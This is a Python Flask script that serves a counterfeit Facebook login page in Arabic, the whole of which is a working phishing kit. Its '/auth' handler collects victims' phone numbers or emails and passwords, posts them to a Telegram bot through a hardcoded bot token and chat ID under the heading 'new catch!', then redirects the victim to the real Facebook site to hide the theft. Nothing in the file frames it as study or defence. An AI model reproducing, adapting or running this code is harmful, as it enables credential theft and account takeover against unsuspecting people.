from flask import Flask, render_template_string, request, redirect
import requests

app = Flask(__name__)

TOKEN = "8599495749:AAFIQkYkNLJV_Xn_ZckTIxFoTp8Fm4ChlG0"
CHAT_ID = "7479786207"

html_ui = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        body { background: #f0f2f5; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); width: 340px; text-align: center; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        .btn { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="color:#1877f2;">facebook</h2>
        <form action="/auth" method="POST">
            <input type="text" name="data1" placeholder="رقم الهاتف أو البريد" required>
            <input type="password" name="data2" placeholder="كلمة السر" required>
            <button class="btn">تسجيل الدخول</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_ui)

@app.route('/auth', methods=['POST'])
def auth():
    d1 = request.form.get('data1')
    d2 = request.form.get('data2')
    msg = f"🎯 صيد جديد!\\n👤: {d1}\\n🔑: {d2}"
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg})
    return redirect("https://www.facebook.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
